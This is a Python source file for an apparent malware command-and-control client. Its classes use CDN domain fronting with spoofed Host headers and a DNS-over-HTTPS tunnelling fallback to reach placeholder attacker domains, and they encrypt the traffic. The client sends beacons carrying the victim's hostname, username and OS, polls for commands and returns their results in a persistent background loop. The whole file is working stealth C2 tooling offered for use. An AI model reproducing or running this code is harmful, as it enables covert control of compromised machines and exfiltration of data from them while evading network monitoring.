Core/elite_connection.py
#!/usr/bin/env python3
"""
Elite Connection System with Domain Fronting and DNS over HTTPS
Implements advanced C2 communication methods for stealth
"""

import requests
import json
import ssl
import socket
import base64
import struct
import threading
import time
from urllib.parse import urlparse
from Crypto.Cipher import ChaCha20_Poly1305
from Crypto.Random import get_random_bytes

class EliteDomainFrontedC2:
    """Advanced C2 connection using domain fronting and DNS over HTTPS fallback"""
    
    def __init__(self, encryption_key=None):
        self.cdn_providers = {
            'cloudflare': {
                'front_domains': ['ajax.cloudflare.com', 'cdnjs.cloudflare.com'],
                'host_header': 'your-c2-domain.com',
                'path': '/static/js/jquery.min.js'
            },
            'fastly': {
                'front_domains': ['fastly.net', 'fsdn.com'],
                'host_header': 'your-c2.fastly.net',
                'path': '/assets/main.css'
            },
            'akamai': {
                'front_domains': ['akamaihd.net', 'akamai.com'],
                'host_header': 'c2.akamaized.net',
                'path': '/media/video.mp4'
            }
        }
        
        self.current_provider = None
        self.session = self._create_session()
        self.key = encryption_key or get_random_bytes(32)  # ChaCha20 key
        self.connection_active = False
        
    def _create_session(self):
        """Create HTTP session with realistic headers"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none'
        })
        return session
    
    def connect(self, data):
        """Attempt connection using domain fronting, fallback to DNS over HTTPS"""
        
        # Try domain fronting first
        result = self._try_domain_fronting(data)
        if result:
            self.connection_active = True
            return result
        
        # Fallback to DNS over HTTPS
        result = self._dns_over_https_fallback(data)
        if result:
            self.connection_active = True
            return result
        
        return None
    
    def _try_domain_fronting(self, data):
        """Attempt connection via domain fronting through CDNs"""
        
        # Rotate through CDN providers
        for provider_name, config in self.cdn_providers.items():
            for front_domain in config['front_domains']:
                try:
                    response = self.session.post(
                        f"https://{front_domain}{config['path']}",
                        headers={
                            'Host': config['host_header'],  # This routes to real C2
                            'X-Request-ID': self._generate_request_id(),
                            'Cache-Control': 'no-cache',
                            'Content-Type': 'application/octet-stream'
                        },
                        data=self._encrypt_data(json.dumps(data)),
                        timeout=30,
                        verify=True  # Use CDN's valid SSL cert
                    )
                    
                    if response.status_code == 200:
                        self.current_provider = provider_name
                        return self._decrypt_data(response.content)
                        
                except Exception as e:
                    # Silently continue to next provider
                    continue
        
        return None
    
    def _dns_over_https_fallback(self, data):
        """Use DNS queries for C2 when domain fronting fails"""
        
        # Encode data as DNS queries
        encoded = base64.b32encode(json.dumps(data).encode()).decode().lower()
        
        # Split into DNS labels (max 63 chars each)
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        
        # Use DoH providers
        doh_providers = [
            'https://cloudflare-dns.com/dns-query',
            'https://dns.google/dns-query',
            'https://dns.quad9.net/dns-query'
        ]
        
        for provider in doh_providers:
            try:
                for chunk in chunks:
                    # Create DNS query for TXT record
                    query_name = f"{chunk}.dns.your-domain.com"
                    
                    response = requests.get(
                        provider,
                        headers={'accept': 'application/dns-json'},
                        params={'name': query_name, 'type': 'TXT'},
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        # Extract C2 response from TXT records
                        result = response.json()
                        if 'Answer' in result:
                            for answer in result['Answer']:
                                if answer['type'] == 16:  # TXT record
                                    return self._decode_dns_response(answer['data'])
            except:
                continue
        
        return None
    
    def _encrypt_data(self, data):
        """Encrypt data using ChaCha20-Poly1305"""
        try:
            cipher = ChaCha20_Poly1305.new(key=self.key)
            ciphertext, tag = cipher.encrypt_and_digest(data.encode())
            return cipher.nonce + tag + ciphertext
        except Exception:
            # Fallback to base64 if crypto fails
            return base64.b64encode(data.encode())
    
    def _decrypt_data(self, data):
        """Decrypt data using ChaCha20-Poly1305"""
        try:
            nonce = data[:12]
            tag = data[12:28]
            ciphertext = data[28:]
            cipher = ChaCha20_Poly1305.new(key=self.key, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            return json.loads(plaintext.decode())
        except Exception:
            # Fallback to base64 if crypto fails
            try:
                return json.loads(base64.b64decode(data).decode())
            except:
                return {"error": "Failed to decrypt response"}
    
    def _generate_request_id(self):
        """Generate realistic request ID"""
        import uuid
        return str(uuid.uuid4())
    
    def _decode_dns_response(self, txt_data):
        """Decode C2 response from DNS TXT record"""
        try:
            # Remove quotes and decode
            clean_data = txt_data.strip('"')
            decoded = base64.b32decode(clean_data.upper())
            return json.loads(decoded.decode())
        except:
            return None
    
    def send_beacon(self, client_info):
        """Send beacon with client information"""
        beacon_data = {
            'type': 'beacon',
            'client_id': client_info.get('id'),
            'hostname': client_info.get('hostname'),
            'username': client_info.get('username'),
            'os': client_info.get('os'),
            'timestamp': int(time.time())
        }
        
        return self.connect(beacon_data)
    
    def send_command_result(self, command, result, client_id):
        """Send command execution result back to C2"""
        result_data = {
            'type': 'result',
            'command': command,
            'result': result,
            'client_id': client_id,
            'timestamp': int(time.time())
        }
        
        return self.connect(result_data)
    
    def get_commands(self, client_id):
        """Poll for new commands from C2"""
        poll_data = {
            'type': 'poll',
            'client_id': client_id,
            'timestamp': int(time.time())
        }
        
        response = self.connect(poll_data)
        if response and 'commands' in response:
            return response['commands']
        return []
    
    def maintain_connection(self, client_info, callback=None):
        """Maintain persistent connection with C2"""
        
        def connection_loop():
            while self.connection_active:
                try:
                    # Send beacon
                    self.send_beacon(client_info)
                    
                    # Poll for commands
                    commands = self.get_commands(client_info.get('id'))
                    
                    # Execute callback if provided
                    if callback and commands:
                        callback(commands)
                    
                    # Wait before next poll
                    time.sleep(30)  # 30 second intervals
                    
                except Exception as e:
                    # Connection error, try to reconnect
                    time.sleep(60)  # Wait longer on error
                    continue
        
        # Start connection thread
        connection_thread = threading.Thread(target=connection_loop, daemon=True)
        connection_thread.start()
        
        return connection_thread
    
    def disconnect(self):
        """Cleanly disconnect from C2"""
        self.connection_active = False
        if self.session:
            self.session.close()


class ConnectionManager:
    """Manages multiple connection methods and failover"""
    
    def __init__(self):
        self.connections = []
        self.active_connection = None
        
    def add_connection(self, connection):
        """Add a connection method"""
        self.connections.append(connection)
    
    def connect(self, data):
        """Try connections in order until one succeeds"""
        for conn in self.connections:
            try:
                result = conn.connect(data)
                if result:
                    self.active_connection = conn
                    return result
            except:
                continue
        return None
    
    def get_active_connection(self):
        """Get currently active connection"""
        return self.active_connection


def create_elite_connection(encryption_key=None):
    """Factory function to create configured elite connection"""
    
    # Create domain fronting connection
    df_connection = EliteDomainFrontedC2(encryption_key)
    
    # Create connection manager
    manager = ConnectionManager()
    manager.add_connection(df_connection)
    
    return manager


if __name__ == "__main__":
    # Test the connection system
    # print("Testing Elite Connection System...")
    
    # Create connection
    conn = create_elite_connection()
    
    # Test data
    test_data = {
        'type': 'test',
        'message': 'Elite connection test',
        'timestamp': int(time.time())
    }
    
    # Try connection
    result = conn.connect(test_data)
    
    if result:
        pass
        # print("✅ Connection test successful")
        # print(f"Response: {result}")
    else:
        pass
        # print("❌ Connection test failed - C2 server not available")
        # print("This is expected in isolated test environment")